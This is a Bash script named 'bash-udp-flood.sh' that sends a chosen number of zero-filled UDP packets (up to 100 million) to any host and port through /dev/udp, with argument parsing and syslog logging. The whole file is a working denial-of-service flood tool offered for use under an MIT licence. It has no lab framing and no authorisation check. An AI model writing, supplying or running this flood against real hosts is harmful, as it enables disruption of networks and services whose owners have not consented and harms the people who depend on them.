#!/usr/bin/env bash


# Created by:   VPR
# Created:      September 1st, 2025

# Updated:      VPR
# Updated:      September 1st, 2025

# Description:  A simple udp socket script for sending udp packets to a target.

# Usage:        usage: bash-udp-flood.sh [-h] -H HOST -p PORT [-n N_PACKETS] [-6]

# License:      MIT (c) VPR, VPR-labs, et. al, 2025


set -Eeuo pipefail
IFS=$'\n\t'

SCRIPT_NAME="${0##*/}"

HOST=""
PORT=8000
N_PACKETS=1000
IPV6=false
PAYLOAD_LEN=32
LOG_FILE=""
VERBOSE=false

log()         { printf '[%s] %s\n' "$(date -u +%FT%TZ)" "$*";           }
log_info()    { log "[ ] $*"; logger -t "$SCRIPT_NAME" -- "INFO    $*"; }
log_success() { log "[+] $*"; logger -t "$SCRIPT_NAME" -- "SUCCESS $*"; }
log_warn()    { log "[!] $*"; logger -t "$SCRIPT_NAME" -- "WARN    $*"; }
log_error()   { log "[-] $*"; logger -t "$SCRIPT_NAME" -- "ERROR   $*"; }
die()         { log_error "$*"; exit 1;                                 }

tee_if() {
  if [[ -n "$LOG_FILE" ]]; then tee -a "$LOG_FILE"; else cat; fi
}

# ----- Usage -----------------------------------------------------------------
usage() {
  cat <<EOF
${SCRIPT_NAME} 

USAGE:
  ${SCRIPT_NAME} -H <host> [-p <port>] [-n <packets>] [-6]

OPTIONS:
  -H, --host            Target host or IP (required).
  -p, --port            UDP destination port (1..65535). Default: ${PORT}
  -n, --iterations      Number of packets to send. Default: ${N_PACKETS}
  -6, --ipv6            Use IPv6 (default IPv4).
      --log-file        Append run logs to this file (always logs to syslog).
  -h, --help            Show help and exit.
EOF
}

# ----- Arg parsing ------------------------------------------------------------
long_opts="host:,port:,iterations:,log-file:,ipv6,help"
getopt_out="$(getopt -o H:p:n:6h --long "$long_opts" -n "$SCRIPT_NAME" -- "$@")" || {
  usage >&2; exit 2;
}
eval set -- "$getopt_out"
while true; do
  case "$1" in
    -H|--host)       HOST="$2";      shift 2;;
    -p|--port)       PORT="$2";      shift 2;;
    -n|--iterations) N_PACKETS="$2"; shift 2;;
    -6|--ipv6)       IPV6=true;      shift;;
       --log-file)   LOG_FILE="$2";  shift 2;;
    -h|--help)       usage;          exit 0;;
    --)                              shift; break;;
    *) die "Unknown option: $1";;
  esac
done

# ----- Validation -------------------------------------------------------------
[[ -n "$HOST" ]] || { usage >&2; die "Missing required -H|--host."; }

if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT >=1 && PORT <= 65535 )); then :; else
  die "Port must be an integer in [1,65535]. Got: $PORT"
fi

if [[ "$N_PACKETS" =~ ^[0-9]+$ ]] && (( N_PACKETS >= 1 && N_PACKETS <= 100000000 )); then :; else
  die "Iterations must be a positive integer (reasonable ceiling enforced). Got: $N_PACKETS"
fi

if [[ "$PAYLOAD_LEN" =~ ^[0-9]+$ ]] && (( PAYLOAD_LEN >= 1 && PAYLOAD_LEN <= 65507 )); then :; else
  die "Payload length must be [1,65507] bytes (UDP max without fragmentation). Got: $PAYLOAD_LEN"
fi

# Resolve host (best effort)
if $IPV6; then
  getent ahosts "$HOST" | awk '/STREAM/ && $1 ~ /:/ {print; exit}' >/dev/null || \
    log_warn "IPv6 resolution for '$HOST' not confirmed. Proceeding…"
else
  getent ahosts "$HOST" | awk '/STREAM/ && $1 ~ /^[0-9.]+$/ {print; exit}' >/dev/null || \
    log_warn "IPv4 resolution for '$HOST' not confirmed. Proceeding..."
fi

function udp_flood {
  log_warn "Preparing UDP flood: host=${HOST} port=${PORT} packets=${N_PACKETS} len=${PAYLOAD_LEN}B ipv6=${IPV6}"
  if [[ -n "$LOG_FILE" ]]; then
    log_info "Appending logs to: ${LOG_FILE}"
    touch "$LOG_FILE" && chmod 0600 "$LOG_FILE" || die "Cannot open log file: $LOG_FILE"
  fi

  log_info "Sending ${N_PACKETS} packets to ${HOST}:${PORT}..."
  for i in $(seq 1 ${N_PACKETS}); do
    head -c "${PAYLOAD_LEN}" /dev/zero > "/dev/udp/${HOST}/${PORT}"
  done
  log_success "${N_PACKETS} sent to ${HOST}:${PORT}."
} 

udp_flood 2>&1 | tee_if
